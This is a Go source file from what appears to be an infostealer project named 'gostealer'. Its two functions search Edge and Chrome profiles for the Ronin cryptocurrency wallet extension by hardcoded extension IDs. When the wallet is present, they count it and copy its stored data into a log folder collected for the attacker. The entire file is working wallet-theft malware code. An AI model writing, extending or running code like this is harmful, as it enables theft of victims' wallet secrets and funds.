package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyRoninEdge(browserPath, logFolderPath string) {
	roninc := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")

	ronine := path.Join(browserPath, "Default", "Local Extension Settings", "kjmoohlgokccodicjjfebfomlbljgfhk")

	if _, err := os.Stat(roninc); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "ronin_edge_chromeversion\n"
	}
	if _, err := os.Stat(ronine); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "ronin_edge\n"
	}
	//_____________________
	utils.CopyFolderFiles(roninc, path.Join(logFolderPath, "wallets", "ronin_edge_chromeversion"))

	utils.CopyFolderFiles(ronine, path.Join(logFolderPath, "wallets", "ronin_edge"))
}

func CopyRoninChrome(browserPath, logFolderPath string) {
	ronin := path.Join(browserPath, "Default", "Local Extension Settings", "fnjhmkhhmkbjkkabndcnnogagogbneec")

	if _, err := os.Stat(ronin); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "ronin_chrome\n"
	}
	//______________________

	utils.CopyFolderFiles(ronin, path.Join(logFolderPath, "wallets", "ronin_chrome"))
}
